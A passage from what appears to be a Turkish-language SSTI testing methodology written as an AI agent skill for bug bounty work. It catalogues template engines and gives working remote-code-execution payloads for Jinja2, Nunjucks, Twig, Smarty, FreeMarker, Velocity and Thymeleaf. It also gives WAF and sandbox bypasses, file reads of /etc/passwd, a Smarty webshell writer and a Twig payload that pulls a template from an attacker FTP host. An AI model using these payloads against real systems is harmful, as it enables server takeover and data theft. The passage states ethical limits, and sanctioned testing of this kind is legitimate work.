  Blind SSTI metodolojisiyle (§9) örtüşür: reflected response beklemek
  yerine, canary'nin döndüğü ayrı bir mesaj/event'i (timing veya OOB
  ile) izle. Subscription/pub-sub tabanlı mimarilerde (örn. bir
  bildirim mesajının şablonlanması) bu genelde **stored/indirect**
  zincire (§9.1) daha yakındır: payload bir mesaj olarak kaydedilir,
  render başka bir bağlantıda/abonelikte gerçekleşir.

---

## 12. Engine Profilleri ve Payload Kütüphanesi

> Her profil şu yapıyla organize edilmiştir: Technology fingerprint,
> Syntax/Delimiter, Generic detection, Confirmation/RCE payload'ları,
> Sandbox davranışı, Version/Configuration notları, Known
> vulnerabilities. Confirmation payload çıktıları **otomatik "safe"
> değildir** — hedefe göre hassas bilgi/erişim sağlayabilir (bkz. §10.2).
> Tüm aritmetik örnekler `6666*6666 → 44435556` kuralına göre
> güncellenmiştir.

### 12.1 Python / PHP "Jinja-benzeri" Aile: Jinja2, Nunjucks, Tornado, Twig, Django Templates, Smarty

#### Jinja2 (Python — Flask ve çoğu custom Python web app)

- **Technology fingerprint:** Flask, çoğu custom Python microservice;
  `Server: Werkzeug` header'ı weak indicator olabilir.
- **Delimiter:** `{{ }}` ifade, `{% %}` statement, `{# #}` yorum.
- **Generic detection:**
  - `{{6666*6666}}` → `44435556`
  - `{{44444444-8888}}` → `44435556` (aynı hedef değer, çıkarma probu)
  - `{{6666*'6666'}}` → `'6666'` string'inin 6666 kez tekrarı (uzun bir
    string; tam string yerine uzunluk farkına bakmak da geçerlidir)
  - `{{config}}`, `{{config.items()}}` — Flask config objesini döker.
  - `{{4*4}}[[5*5]]` gibi çift-delimiter denemeleri, hangi kısmın
    işlendiğini ayırt etmede kullanılabilir.
- **Error signatures (Strong indicator):**
  `jinja2.exceptions.TemplateSyntaxError`, `UndefinedError`.
- **RCE / confirmation zinciri (bilinen bir gadget ailesi —
  `__builtins__`'a bağımlı değildir, ama environment/configuration/
  sandbox/context'e göre değişebilir; kullanmadan önce hedefte
  doğrula):**
  ```
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
  {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
  {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
  ```
  Daha kısa (bazı Jinja2 sürümlerinde doğrudan çalışan) varyantlar:
  ```
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  {{ joiner.__init__.__globals__.os.popen('id').read() }}
  {{ namespace.__init__.__globals__.os.popen('id').read() }}
  ```
- **Sandbox:** Default: sandbox'sız. Configuration-dependent:
  `SandboxedEnvironment` kullanılıyorsa `__class__`/`__mro__`/
  `__globals__` erişimleri açıkça engellenir — bu engelleme mesajı
  sandbox'ın **var olduğunu** kanıtlar.
- **OOB potansiyeli:** Sandbox'sız ortamda `os.popen('curl ...')`
  zincirine kadar gidilebilir.
- **Ek not:** Python'un kendi sandbox bypass tekniklerine dair genel
  bilgi (Python sandbox escape teknikleri) ayrı, geniş bir konudur;
  bu skill kapsamında yalnızca Jinja2 template context'i içinde
  kullanılan gadget zincirleri ele alınmıştır.

#### Nunjucks (Node.js — Mozilla)

- **Technology fingerprint:** Node.js/Express uygulamaları.
- **Syntax:** Jinja2'ye çok benzer (`{{ }}`, `{% %}`).
- **Generic detection:** `{{6666*6666}}` → `44435556`;
  `{{44444444-8888}}` → `44435556` (aynı hedef değer, çıkarma probu).
- **RCE / confirmation:**
  ```
  {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
  ```
  *(Metadata — §14.2: payload_stage=P6, prerequisites:
  `evaluation=confirmed`, `engine=Nunjucks`, `node_runtime=true`,
  `commonjs_entrypoint=true` (`process.mainModule` **deprecated ve
  yalnızca CommonJS giriş noktalarında** doludur — ESM/`import`
  tabanlı modern Node uygulamalarında `undefined` olabilir; bu payload
  ESM-only bir hedefte başarısız olur, bu "SSTI yok" anlamına gelmez),
  `range_object_available=true` (context'te `range` global helper'ının
  expose edilmiş olması gerekir — bazı sandbox/whitelist
  konfigürasyonlarında kaldırılmış olabilir), `sandbox=absent`
  (default); side_effect_level=read-only — yine de §0.2 etik sınırına
  tabidir, `id`/`whoami` dışına çıkılmaz.)*
  Aynı teknik reverse-shell **kurmadan** yalnızca komut çıktısını almak
  için kullanılabilir; DoS/kalıcı bağlantı gerektiren varyantlar (örn.
  `bash -i >& /dev/tcp/...`) **kullanılmaz** (bkz. §0.2 Etik / Güvenlik Sınırı).
- **Sandbox:** Version/configuration-dependent: kısmi; bazı sürümler
  autoescape varsayılan açık.
- **Jinja2 ile ayrım:** `{{config}}` Nunjucks'ta anlamsızdır; Nunjucks'ta
  yerine `{{range}}` gibi Node native objelerinin varlığına bak.
- **Dikkat — JS type coercion (Python semantiğiyle karıştırma):**
  Nunjucks/EJS/JsRender/PugJs gibi **JavaScript tabanlı** motorlarda
  `'6666'*6666` ifadesi, Jinja2/Tornado'daki (Python) gibi **string
  tekrarı üretmez** — JS'in `*` operatörü her iki tarafı da sayıya
  zorlar (type coercion), sonuç yine `44435556` (numerik) olur. Bu
  yüzden §5'teki "String evaluation" adımı (`{{6666*'6666'}}` → uzun
  string tekrarı) **yalnızca Python-family motorlar için geçerlidir**
  (bkz. §5 adım 3, orada da yalnızca "Jinja2/Tornado gibi" diye
  sınırlandırılmıştır); JS-family bir motorda bu probe negatif/aynı
  sonuç dönerse bu "SSTI yok" anlamına gelmez, yalnızca "string tekrarı
  fingerprint'i bu ailede işe yaramaz" anlamına gelir.

#### Tornado (Python)

- **Technology fingerprint:** Tornado framework tabanlı Python
  uygulamaları.
- **Generic detection:** `{{6666*6666}}` → `44435556`;
  `{{44444444-8888}}` → `44435556` (aynı hedef değer, çıkarma probu);
  `{{6666*'6666'}}` → uzun string tekrarı (Jinja2 ile aynı davranış).
- **RCE / confirmation:** Tornado template statement'ları `{% %}`
  içinde doğrudan Python import'una izin verebilir:
  ```
  {% import os %}
  {{os.system('id')}}
  ```
- **Sandbox:** Default: yok.

#### Twig (PHP — Symfony, Craft CMS, Grav, October CMS)

- **Technology fingerprint:** Symfony, Craft CMS, Grav, October CMS.
- **Delimiter:** `{{ }}` ifade, `{% %}` statement, `{# #}` yorum.
- **Generic detection:**
  - `{{6666*6666}}` → `44435556`
  - `{{44444444-8888}}` → `44435556` (aynı hedef değer, çıkarma probu)
  - `{{6666*'6666'}}` genelde hata verir (Jinja2'den ayrım noktası)
  - `{{6666/0}}` → hata (Twig'e özgü error signature elde etmek için
    kullanılabilir)
- **Error signatures (Strong indicator):** `Twig\Error\SyntaxError`.
- **Bilgi toplama (side-effect-free, ama otomatik "safe" değil):**
  - `{{_self}}` — mevcut template objesi.
  - `{{_self.env}}`
  - `{{dump(app)}}` — Symfony debug fonksiyonu (varsa; debug modu
    kapalıysa çalışmaz).
  - `{{app.request.server.all|join(',')}}`
  - Dosya okuma (bazı Twig sürümlerinde `file_excerpt` filtresi
    mevcutsa): `{{'/etc/passwd'|file_excerpt(1,30)}}`

##### Twig — Gerçek Dünyada Doğrulanmış Payload'lar (Kullanıcı Katkısı)

Aşağıdaki payload'lar, gerçek bir bug bounty programında Twig
kullanan bir hedefte **defalarca doğrulanmış ve ödüllendirilmiş**
raporlarda kullanılmıştır. Bu payload'ların ortak tekniği: Twig'in
array/collection filtrelerini (`sort`, `map`, `filter`) bir **callback
fonksiyonu** kabul edecek şekilde kötüye kullanmaktır — bu filtreler
normalde bir sıralama/dönüştürme/filtreleme fonksiyonu bekler, ancak
callback olarak `system`, `call_user_func` gibi PHP native
fonksiyonları verildiğinde, filtrenin array elemanları üzerinde bu
fonksiyonu çağırması sağlanır ve bu da dolaylı komut çalıştırmaya
dönüşür. Bu, doğrudan `_self.env.registerUndefinedFilterCallback`
tekniğine bir alternatiftir ve bazı sandbox/filtre konfigürasyonlarında
o teknik engellenmişken bu teknik çalışabilir:

**Sandbox notu — versiyon/CVE numarasına dayanma, ampirik doğrula:**
Bu payload ailesi (`sort('system')`, `map('system')`, `filter('system')`)
**string/PHP callable adı** kabul edilmesine dayanır. Twig'in farklı
sürümleri bu davranışı farklı şekillerde ele almıştır: bazı sürümlerde
sandbox extension aktifken bu filtreler yalnızca gerçek bir `\Closure`
(Twig arrow function, `(x) => ...`) kabul eder ve string callable
geçirilirse hata fırlatır; bazı sürümlerde ise (dinamik sandbox
policy'leri kullanıldığında) bu kısıtlamanın bypass edilebildiği
bilinmektedir — yani "sandbox var, bu yüzden bu gadget kesin kapalı"
varsayımı her zaman doğru değildir. **Kasıtlı olarak burada spesifik
sürüm numaraları veya zafiyet kimlikleri (CVE/GHSA) verilmemiştir** —
bu tür kimlikler ve onlara bağlı sürüm aralığı iddiaları zamanla
düzeltilebilir, yanlış atfedilebilir veya güncelliğini yitirebilir;
dosyaya gömülü, eskiyebilecek bir "sürüm X'te düzeltildi" iddiası
gerçek testte yanıltıcı olabilir.

**Pratik sonuç (versiyon numarasına göre elaborate bir karar ağacı
kurmadan, tek cümleyle):** Bu payload ailesi **version/configuration-
dependent** olarak ele alınmalı — hedefte sandbox aktifse önce dene,
hata alırsan bunun "SSTI yok" değil "bu gadget kapalı" anlamına
geldiğini bilerek `_self.env.registerUndefinedFilterCallback` gibi
alternatif bir gadget'a veya sandbox'ın izin verdiği fonksiyon
whitelist'ine geç (§12.1 Sandbox notu). Hangi Twig sürümünün hangi
zafiyetten etkilendiğini önceden hesaplamaya çalışmak (agent'ın kendi
sürüm-tespit mantığı kurması) gereksiz karmaşıklıktır ve request
bütçesini SSTI'nin kendisini bulmaktan çok "hangi sürümdeyim"
sorusuna harcatır — davranışı doğrudan hedefte test etmek, eskiyebilen
bir kimliğe/iddiaya güvenmekten daha güvenilirdir; bu skill bunu
kasıtlı olarak böyle ele alır.

```twig
{{['id',1]|sort('system')|join}}
{{['id',1]|map('system')|join}}
{{['id',1]|filter('system')|join}}
{{{'1':'id'}|filter('system')|url_encode}}
{{{'1':'id'}|map('system')|url_encode}}
{{{'1':'id'}|map('system')|join}}
{{['system', 'id'] | sort('call_user_func') }}
```

**Nasıl çalışır:**
- `sort('system')` — Twig'in `sort` filtresi, bir karşılaştırma
  callback'i olarak `system` alır; array elemanları bu fonksiyona
  argüman olarak geçirilir, bu da `system('id')` çağrısına dönüşür.
- `map('system')` — array'in her elemanına `system` fonksiyonunu
  uygular; array `['id', 1]` olduğunda ilk eleman komut olarak
  çalıştırılır.
- `filter('system')` — benzer mantıkla, `system`'in dönüş değerine
  (`false`/`0` gibi) göre filtreleme yapılırken yan etki olarak komut
  çalıştırılmış olur.
- `url_encode` filtresi zincire eklenerek çıktı URL-safe hale
  getirilir — bu hem WAF'ın çıktıyı yakalamasını zorlaştırabilir hem
  de response'ta özel karakterlerin bozulmadan görünmesini sağlar
  (encoding'i kanıt toplama aracı olarak kullanma — bkz. §8.1).
- `{'1':'id'}` şeklindeki bir dict/map literalı, array yerine
  kullanıldığında bazı filtre implementasyonlarında farklı bir
  code-path'e girip WAF/sandbox imzalarını atlatabilir.

**Bilinen WAF/filtre bypass payload'ı — çift URL-encoding tekniği:**

```
{%25set+x%25}id{%25endset%25}{%25set+y%25}system{%25endset%25}{{[x]|map(y|nl2br)}}asd&sent=1
```

Bu payload, `{% set x %}...{% endset %}` (Twig'de bir değişkeni bir
blok içeriğiyle tanımlama sözdizimi) yapısını **çift URL-encode**
ederek gönderir: `%25` aslında encode edilmiş `%` karakteridir, yani
sunucu isteği **bir kez** URL-decode ettiğinde `{%set+x%}` gibi bir
ara forma dönüşür ve ardından uygulamanın kendi iç işleyişi (veya
tarayıcı/framework'ün otomatik ikinci decode'u) bunu nihai `{% set x %}`
haline getirir. Eğer bir WAF/filtre yalnızca **tek katman decode
edilmiş** isteği inceliyorsa (yani `{% set` gibi literal bir string
arıyorsa) ve gerçek trafik iki katman encode edilmiş geliyorsa, filtre
bu payload'ı yakalayamaz — ama uygulamanın kendisi (çift decode
davranışı gösteriyorsa) payload'ı doğru şekilde işleyip çalıştırır.
Payload'ın devamında `x` değişkenine `id` komutu, `y` değişkenine
`system` fonksiyon adı atanır, ardından `{{[x]|map(y|nl2br)}}` ile
`map` filtresi üzerinden `system('id')` dolaylı olarak çağrılır (`y`
değişkeninin `nl2br` filtresinden geçirilmesi, bazı sandbox
implementasyonlarının "callback bir string literal olmalı" kontrolünü
atlatmak için ek bir dolaylama katmanıdır). `asd&sent=1` sonu, bu
payload'ın büyük olasılıkla bir form submission'ının parçası olarak
gönderildiğini ve `sent=1` gibi bir sonraki parametrenin akışı
bozmaması için eklendiğini gösterir — bu, gerçek dünya bug bounty
testlerinde payload'ların genelde izole bir "SSTI test aracı" değil,
**gerçek bir form akışının içine** yerleştirilerek denenmesi
gerektiğinin de bir hatırlatıcısıdır.

**Bu payload ailesinin skill'e kattığı genel prensip:** Bir WAF/sandbox
doğrudan tehlikeli fonksiyon adlarını (`system`, `exec`,
`registerUndefinedFilterCallback`) bir template string'i içinde
literal olarak arıyorsa, bu fonksiyon adını **bir değişkene atayıp
(`{% set %}`) değişken üzerinden dolaylı çağırmak**, ya da **array/map
filtrelerinin callback parametresi olarak vermek**, imza tabanlı
filtrelerin çoğunu atlatabilir. Bu teknik yalnızca Twig'e özgü değildir
— aynı mantık (dolaylı callback çağırma) HuBL/Jinjava'daki
`registerUndefinedFilterCallback` ve JavaScript motorlarındaki
`constructor` zincirleme tekniklerinde de görülür (bkz. §12.2, §12.3).

**Diğer klasik Twig RCE/bilgi toplama payload'ları (referans):**

```twig
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{['id',""]|sort('system')}}
{{["error_reporting", "0"]|sort("ini_set")}}
```

Son satır (`ini_set` ile `error_reporting`'i kapatma), otomatik
exploitation sırasında hata/warning mesajlarının response'u
kirletmesini önlemek için kullanılan yardımcı bir tekniktir — doğrudan
RCE sağlamaz ama sonraki payload'ların çıktısını temizler.

- **Sandbox:** Configuration-dependent — Twig'in `SandboxExtension`'ı
  özellikle CMS'lerde kullanıcı şablonu render edilen yerlerde genelde
  aktif olarak kullanılır, ama bu **default davranış değildir**, her
  hedefte doğrulanmalıdır. Yukarıdaki `sort`/`map`/`filter` callback
  teknikleri, bazı sandbox konfigürasyonlarında `_self.env.*` erişimi
  engellenmiş olsa bile çalışabildiği için özellikle değerlidir.
- **Version differences:** Eski Twig sürümlerinde bazı `_self`
  erişimleri farklı davranır; sonraki sürümlerde sandbox extension
  daha yaygın varsayılan hale gelmiştir.

#### Django Templates (Python — Django, bazen Wagtail)

Django Templates, Jinja2 gibi bir **genel expression engine değildir**
— kasıtlı olarak kısıtlı bir DSL'dir (yalnızca değişken çözümleme,
filtre çağırma ve az sayıda statement tag'i). Bu yüzden Jinja2
varsayımlarıyla test etmek (doğrudan arithmetic/gadget payload'ları
denemek) sistematik olarak false-negative'e yol açar. Doğru yaklaşım,
motorun **gerçekte izin verdiği** dört yüzeyi ayrı ayrı taramaktır.

- **Technology fingerprint:** Django, Wagtail.
- **Önemli negative indicator:** `{{6666*6666}}` genelde **çalışmaz**
  (aritmetik ifade desteklenmez) — bu, "SSTI yok" anlamına gelmez,
  yalnızca "Jinja2 tarzı arithmetic yüzeyi yok" anlamına gelir.

**Yüzey 1 — Variable resolution (her zaman mevcut):**
- `{{ 6666|add:6666 }}` → `13332` (filtre tabanlı toplama, arithmetic
  yerine kullanılabilecek generic detection sinyali).
- `{{ some_undefined_var_AAA1234 }}` → boş string döner (Django,
  Jinja2'nin aksine `UndefinedError` fırlatmaz) — bu davranış farkı
  tek başına bir **fingerprinting sinyalidir**: Jinja2'de tanımsız
  değişken hata verirken Django'da sessizce boş döner.

**Yüzey 2 — Attribute traversal (dikkatle sınırlı ama var):**
Django Templates `.` operatörünü sırasıyla dictionary key → attribute
→ list-index → method-call olarak dener. Yani `{{ obj.attr }}` şu
sırayla denenir: `obj["attr"]`, `obj.attr`, `obj[0]` (attr sayısalsa),
`obj.attr()` (attribute bir callable ise **otomatik çağrılır**, ancak
yalnızca argümansız metodlar). Bu, context'e geçirilen objenin
sınıfına bağlı olarak ciddi bir attribute-traversal yüzeyi açar:
```
{{ request.user.is_superuser }}
{{ request.META }}
{{ request.session.items }}
```
Context'te hangi objelerin (`request`, `user`, custom context
processor'lardan gelen objeler) mevcut olduğunu §4 Sink Discovery
aşamasında haritalamak, bu yüzeyi genişletmenin anahtarıdır.

**Yüzey 3 — Custom filter/tag üzerinden escalation (application-
specific, en yüksek etkili yol):**
Django'nun kendisi `system`/`import` gibi tehlikeli bir built-in filtre
sunmaz — ama gerçek projeler genelde kendi custom filtrelerini/tag'
lerini tanımlar (`@register.filter`, `@register.simple_tag`). Eğer
kullanıcı girdisi bir **custom filtreye argüman olarak** ulaşıyorsa ve
o filtre içeride dosya okuma/subprocess/dinamik import gibi bir işlem
yapıyorsa, gerçek RCE/bilgi sızıntısı buradan gelir — bu klasik "SSTI"
değil, "template context üzerinden application-specific gadget"tır,
ama pratik etkisi aynıdır. **Karar dalı:**
```
Django Templates tespit edildi
  ↓
generic arithmetic negatif (beklenen)
  ↓
attribute traversal ile context objelerini keşfet (Yüzey 2)
  ↓
hassas obje/veri bulundu mu?
 ├─ evet → Impact olarak raporla (bilgi sızıntısı)
 └─ hayır → uygulamaya özgü custom filter/tag var mı araştır
             (kaynak kod erişimi varsa doğrudan bak; yoksa aşağıdaki
             black-box probe seti kullanılır)
             ↓
             custom filter/tag kullanıcı girdisini işliyor mu?
              ├─ evet → application-specific escalation (§4 Source→Sink
              │         ile doğrula, bu artık genel Django SSTI değil,
              │         o projeye özgü bir zafiyettir)
              └─ hayır → NEGATIVE/INCONCLUSIVE ile dur
```

**Black-box custom filter/tag keşfi (kaynak koda erişim yoksa) —
somut probe seti:**
- **Tag library keşfi:** `{% load AAA_nonexistent_lib_1234 %}` gönder
  (yalnızca hedefin **kendi** template'inde çalıştırabildiğin bir
  yerde, örn. çift-render eden bir preview alanında anlamlıdır — çoğu
  black-box senaryoda bu doğrudan test edilemez, ama kaynak sızıntısı
  varsa `TemplateSyntaxError: '...' is not a registered tag library`
  hatası hangi custom app'lerin/tag kütüphanelerinin yüklü olduğunu
  ele verir).
- **Filtre varlığı — DİKKAT, yaygın bir yanlış varsayım:** Django'da
  tanımsız bir filtre **"sessizce boş dönmez"** — bu, tanımsız
  **değişken** davranışıdır (Yüzey 1), filtreyle karıştırılmamalıdır.
  Tanımsız bir filtre her zaman derleme-zamanı bir
  `TemplateSyntaxError: Invalid filter: '...'` fırlatır (DEBUG=True
  ise detaylı traceback, DEBUG=False ise genel bir 500 sayfası olarak
  görünür). Bu yüzden doğru black-box sinyali "boş vs dolu" değil,
  **"sayfa kırılıyor mu kırılmıyor mu"**dur: bilinen bir filtre adıyla
  (`|upper`, `|lower`) test edilen bir alan normal render olurken,
  tahmin edilen bir custom filtre adıyla (`|export_to_pdf`,
  `|render_template` gibi uygulamaya özgü isim tahminleri) test edilen
  aynı alan **sayfayı kırıyorsa** (500/hata sayfası) → filtre
  muhtemelen **var** ama argüman tipi/değeri beklenmedik; kırılmıyorsa
  → ya filtre yok ya da (yaygın olmayan bir durum) hatayı sessizce
  yutan bir custom `render` fonksiyonu var — bu durumda §9 Blind SSTI
  metodolojisine (timing/OOB) geç.

**Yüzey 4 — Statement tag'leri (`{% %}`):** `{% include %}`,
`{% extends %}`, `{% with %}`, `{% for %}` gibi tag'ler genelde
**sabit** (developer tarafından yazılan) template adlarıyla çalışır;
kullanıcı girdisi doğrudan `{% include user_input %}` şeklinde bir
template **adı** olarak kullanılıyorsa (nadir ama ciddi), bu **Local
File Inclusion benzeri** bir zafiyettir — klasik SSTI'den ayrı
değerlendirilmeli ama aynı raporda not edilmelidir.

- **Application-specific not:** Django projelerinde bazen Jinja2 de
  yapılandırılmış olabilir (Django, birden fazla template backend'i
  aynı anda destekler) — ikisini ayırt etmek için önce `{{6666*6666}}`
  dene, çalışıyorsa muhtemelen o endpoint Jinja2 backend'ini
  kullanıyordur; bu durumda Jinja2 profiline (bu bölümün başı) geç.
- **Sandbox:** Yok (dil kasıtlı olarak kısıtlı olduğu için ayrı bir
  sandbox katmanına ihtiyaç duymaz) — riskin kaynağı sandbox eksikliği
  değil, yukarıdaki Yüzey 2/3'teki application-specific genişlemedir.

#### Smarty (PHP — standalone/legacy projeler, üçüncü taraf entegrasyonlar)

- **Technology fingerprint:** Bağımsız (standalone) eski PHP
  projeleri, ya da bir CMS/framework'e **üçüncü taraf bir modülle**
  eklenmiş Smarty kurulumları. **Not — Magento ile karıştırma:** §13'teki
  CMS tablosunda belirtildiği gibi Magento (M1/M2) **native olarak
  Smarty kullanmaz** (PHTML + XML layout kullanır); Smarty yalnızca
  Magento'ya üçüncü taraf bir eklenti ile eklenmişse mevcuttur — bunu
  varsaymadan önce doğrula (örn. `{$smarty.version}` probe'unun
  çalışıp çalışmadığına bak).
- **Delimiter:** `{ }` (özelleştirilebilir).
- **Generic detection:** `{6666*6666}` → `44435556`;
  `{44444444-8888}` → `44435556` (aynı hedef değer, çıkarma probu);
  `{$smarty.version}` ile Smarty sürümünü doğrudan öğrenmek mümkündür.
- **RCE / confirmation (version-dependent):**
  ```
  {php}echo `id`;{/php}   // v3'te deprecated
  {system('id')}          // v3 ile uyumlu
  {system('cat index.php')}
  {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
  ```
  Son payload bir **webshell yazma** tekniğidir — bu, "dosya yazma"
  içerdiği için §0.2 Etik / Güvenlik Sınırı'daki "kalıcı sistem değişikliği yok"
  kuralına takılır; yalnızca zafiyetin **var olduğunu** göstermek
  yeterliyse `{system('id')}` gibi side-effect-free bir komutla
  sınırlı kalınmalıdır. Webshell yazma tekniği yalnızca program
  açıkça izin veriyorsa ve raporlama sonrası temizlenebilecekse
  düşünülmelidir.
- **Sandbox:** Version-dependent, büyük ölçüde değişir; genelleme
  yapma.

### 12.2 Java Ailesi: EL/SpEL, FreeMarker, Velocity, Thymeleaf, Spring, Pebble, Jinjava, HuBL, Groovy

> Bu ailede confirmation payload'ları genelde `T(java.lang.Runtime)`
> veya benzer bir sınıf erişimi üzerinden doğrudan kod çalıştırmaya
> gider (sandbox'sız ortamlarda). Java ailesinde **EL Injection ile
> SSTI arasındaki sınır** özellikle önemlidir — bkz. §6 Type Confusion.

#### Java — Temel Expression Injection (genel, EL/SpEL bağlamı)

- **Generic detection:**
  ```
  ${6666*6666}
  ${44444444-8888}
  ${{6666*6666}}
  // ${...} çalışmazsa #{...}, *{...}, @{...} veya ~{...} dene
  ```
- **Bilgi toplama:**
  ```
  ${class.getClassLoader()}
  ${class.getResource("").getPath()}
  ```
- **Ortam değişkenleri (SpEL):**
  ```
  ${T(java.lang.System).getenv()}
  ```
- **Komut çalıştırma:**
  ```
  ${T(java.lang.Runtime).getRuntime().exec('id')}
  ```
  Bazı filtreler doğrudan `Runtime`/`exec` string'lerini engelliyorsa,
  karakter-kod tabanlı bir gizleme (her karakteri `Character.toString`
  ile ayrı ayrı oluşturup `concat` ile birleştirme) filtreyi
  atlatabilir — bu teknik özellikle "Retrieve /etc/passwd" gibi
  senaryolarda otomatik payload üretimi için script'lenebilir bir
  desendir (karakter kodlarının ord() değerine çevrilip
  `T(java.lang.Character).toString(N)` zincirine dönüştürülmesiyle).

#### FreeMarker (Java — Spring, Confluence bazı bileşenler)

- **Delimiter:** `${ }` ifade (her zaman geçerli), `#{ }` **deprecated
  numerical interpolation** (yalnızca sayısal ifadeler için, uzun
  süredir deprecated), `[=...]` **square-bracket alternatif syntax**
  (configuration-dependent), `<# #>` directive, `<#-- -->` yorum.
- **Doğrulanmış configuration notu (KRİTİK — negative sonuç yanıltıcı
  olabilir):** FreeMarker'ın `interpolation_syntax` ayarı üç değer
  alabilir ve hangi delimiter'ın çalışacağını **değiştirir**:
  - `legacy` (varsayılan) → hem `${...}` hem `#{...}` çalışır.
  - `dollar` → yalnızca `${...}` çalışır, `#{...}` düz metin olarak
    kalır.
  - `square_bracket` → yalnızca `[=...]` çalışır, hem `${...}` hem
    `#{...}` düz metin olarak kalır.
  Bu yüzden **`#{6666*6666}`'nın çalışmaması FreeMarker'ı ELEMEZ** —
  yalnızca `dollar` veya `square_bracket` modunda olabileceğini
  gösterir. Aynı şekilde `${...}` çalışmıyorsa `[=6666*6666]` de
  denenmelidir (`square_bracket` modu ihtimaline karşı).
- **Generic detection:**
  - `{{6666*6666}}` → çalışmaz, düz metin olarak kalır (Freemarker'da
    `{{ }}` delimiter yoktur — bu bir negative indicator).
  - `${6666*6666}` → `44435556` (birincil probe, tüm modlarda geçerli
    olma ihtimali en yüksek olan); `${44444444-8888}` → aynı hedef
    değer (`44435556`), çıkarma probu.
  - `#{6666*6666}` → `44435556` ise `legacy` modda; çalışmıyorsa yukarı
    bakın, motoru **ekarte etmez**.
  - `[=6666*6666]` → `44435556` ise `square_bracket` modda; `${...}`
    ve `#{...}` her ikisi de düz metin kalıyorsa bunu dene.
  - `${6666*'6666'}` → hiçbir şey döner (Negative/weak indicator)
  - `${foobar}` → tanımsız değişken hatası
- **Error signatures (Strong indicator):**
  `freemarker.core.ParseException`,
  `freemarker.core.InvalidReferenceException`.
- **RCE / confirmation:**
  ```
  <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
  [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```
- **Dosya okuma (bilgi sızıntısı — otomatik "safe" değil):**
  ```
  ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/hedef_dosya.txt').toURL().openStream().readAllBytes()?join(" ")}
  ```
- **Sandbox bypass (yalnızca Freemarker 2.3.30 öncesi sürümlerde
  çalışır — version-dependent, güncel sürümde doğrulanmadan
  kullanma):**
  ```
  <#assign classloader=article.class.protectionDomain.classLoader>
  <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
  <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
  <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
  ${dwf.newInstance(ec,null)("id")}
  ```
- **Sandbox:** Default: yok. `Execute` gibi utility sınıflarına
  doğrudan erişim genelde mümkündür.

#### Velocity (Java — eski Confluence/Jira sürümleri, bazı Java web app'leri)

- **Delimiter:** `${ }` referans, `#set`, `#if`, `#foreach` directive.
- **Generic detection:** `#set($x=6666*6666)$x` → `44435556`;
  `#set($x=44444444-8888)$x` → `44435556` (aynı hedef değer, çıkarma probu).
- **Error signatures (Strong indicator):**
  `org.apache.velocity.exception.ParseErrorException`.
- **RCE / confirmation (reflection tabanlı, çıktı okuma dahil):**
  ```
  #set($s="")
  #set($stringClass=$s.getClass())
  #set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
  #set($process=$runtime.exec("id"))
  #set($out=$process.getInputStream())
  #set($null=$process.waitFor())
  #foreach($i in [1..$out.available()])
  $out.read()
  #end
  ```
- **Sandbox:** Default: yok; `getClass()` üzerinden reflection genelde
  engellenmez.
- **Version-dependent not:** Velocity, geçmişte Confluence/Jira gibi
  ürünlerde bilinen public SSTI/RCE zincirlerine konu olmuştur; sürüm
  tespiti şart, eski payloadları güncel sürümde otomatik çalışır
  varsayma.

#### Thymeleaf (Java — Spring Boot)

- **Delimiter:** `${ }` (SpEL üzerinden), `th:*` attribute'ları,
  expression inlining için `[[...]]` / `[(...)]`.
- **Generic detection:** `${6666*6666}` → `44435556`;
  `${44444444-8888}` → `44435556` (aynı hedef değer, çıkarma probu).
  Thymeleaf ifadeleri normalde yalnızca belirli attribute'lar içine
  yazılabilir; diğer template konumları için inlining sözdizimi
  gerekir: `[[${6666*6666}]]`.
- **Önemli not — düşük başarı ihtimali:** Thymeleaf'in default
  konfigürasyonu dinamik template üretimini desteklemez (template'ler
  önceden tanımlı olmalıdır). Geliştiricinin özel bir `TemplateResolver`
  ile string'den runtime'da template oluşturması gerekir — bu nadir bir
  durumdur, bu nedenle Thymeleaf hedeflerinde SSTI ihtimali diğer Java
  engine'lerine göre genelde daha düşüktür (ama sıfır değildir).
- **Expression preprocessing (özel bir SSTI benzeri vektör):** Çift alt
  çizgi (`__...__`) içindeki ifadeler önceden işlenir:
  ```
  #{selection.__${sel.code}__}
  ```
  Bu, `${path}` gibi bir değişkenin kontrolsüz kullanıldığı durumlarda
  saldırı yüzeyi oluşturur:
  ```
  <a th:href="@{__${path}__}" th:title="${title}">
  ```
- **RCE / confirmation:**
  - SpringEL: `${T(java.lang.Runtime).getRuntime().exec('id')}`
  - OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}`
  - Tam örnek zafiyet paterni:
    ```
    <a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}" th:title='pepito'>
    ```
- **Sandbox:** Application-specific — Thymeleaf'in kendisi doğrudan
  sandbox sağlamaz; SpEL context yapılandırmasına bağlıdır.
- **EL Injection ile karışma riski:** bkz. §6 — bu ayrımı mutlaka yap.

#### Spring Framework (Java) — Genel SpEL Kullanımı ve Spring View Manipulation

- **RCE / confirmation:**
  ```
  *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
  ```
- **Filtre bypass:** `${...}` çalışmıyorsa `#{...}`, `*{...}`,
  `@{...}` veya `~{...}` dene.
- **Spring View Manipulation (view adı üzerinden SSTI benzeri
  enjeksiyon):**
  ```
